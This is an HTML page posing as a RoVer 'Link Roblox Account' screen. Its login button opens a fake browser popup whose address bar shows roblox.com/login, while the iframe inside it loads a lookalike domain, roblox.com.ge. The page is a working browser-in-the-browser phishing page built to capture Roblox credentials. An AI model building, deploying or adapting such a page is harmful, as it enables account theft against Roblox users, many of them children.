<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RoVer â€“ Login Attempt</title>
<style>
  body { margin:0; font-family: Arial, sans-serif; background:#1d1b1b; color:#fff; }
  .panel { max-width:420px; margin:50px auto; background:#000; padding:20px; border-radius:8px; }
  .login-btn { background:#c91673; border:none; padding:12px; width:100%; cursor:pointer; color:#fff; font-weight:600; font-size:16px; border-radius:6px; }
  .fake-popup { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); width:90%; max-width:700px; height:600px; background:#fff; border-radius:8px; overflow:hidden; z-index:1000; color:#333; border:1px solid #ccc; }
  .window-bar { background:#e0e0e0; height:36px; display:flex; justify-content:space-between; align-items:center; padding:0 10px; font-weight:bold; }
  .popup-close { cursor:pointer; font-size:20px; color:#666; }
  .url-bar { padding:6px 10px; background:#f4f4f4; border-bottom:1px solid #ccc; font-family:monospace; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
  .popup-iframe { width:100%; height:calc(100% - 72px); border:none; }
  .overlay { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); z-index:999; }
  .error-banner { display:none; background:#fff1f1; color:#8a1c1c; padding:10px; font-size:13px; }
</style>
</head>
<body>

<div class="panel">
  <h1>Link Roblox Account</h1>
  <button class="login-btn" id="loginBtn">Log in with Roblox</button>
</div>

<div class="overlay" id="overlay"></div>

<div class="fake-popup" id="fakePopup">
  <div class="window-bar">
    ROBLOX
    <span class="popup-close" id="popupClose">&times;</span>
  </div>
  <div class="url-bar" id="urlDisplay">https://www.roblox.com/login</div>
  <div class="error-banner" id="errorBanner"></div>
  <iframe class="popup-iframe" id="popupIframe"></iframe>
</div>

<script>
const loginBtn = document.getElementById("loginBtn");
const fakePopup = document.getElementById("fakePopup");
const overlay = document.getElementById("overlay");
const popupClose = document.getElementById("popupClose");
const iframe = document.getElementById("popupIframe");
const urlDisplay = document.getElementById("urlDisplay");
const errorBanner = document.getElementById("errorBanner");

loginBtn.addEventListener("click", () => {
  overlay.style.display = "block";
  fakePopup.style.display = "block";
  iframe.src = ""; // reset
  errorBanner.style.display = "none";

  // Direct user click attempt
  setTimeout(() => {
    try {
      iframe.src = "https://roblox.com.ge/login?returnUrl=2099296147452818";
    } catch(e) {
      errorBanner.textContent = "Attempt failed: " + e.message;
      errorBanner.style.display = "block";
    }
  }, 50);

  // Detect if load fails after a few seconds
  setTimeout(() => {
    try {
      const doc = iframe.contentDocument || iframe.contentWindow.document;
      if (!doc || doc.body.innerHTML === "") {
        errorBanner.textContent = "The iframe likely failed to load due to browser security restrictions.";
        errorBanner.style.display = "block";
      }
    } catch(e) {
      errorBanner.textContent = "The iframe likely failed to load due to cross-origin restrictions.";
      errorBanner.style.display = "block";
    }
  }, 4000);
});

popupClose.addEventListener("click", () => {
  overlay.style.display = "none";
  fakePopup.style.display = "none";
  iframe.src = "";
});
</script>

</body>
</html>
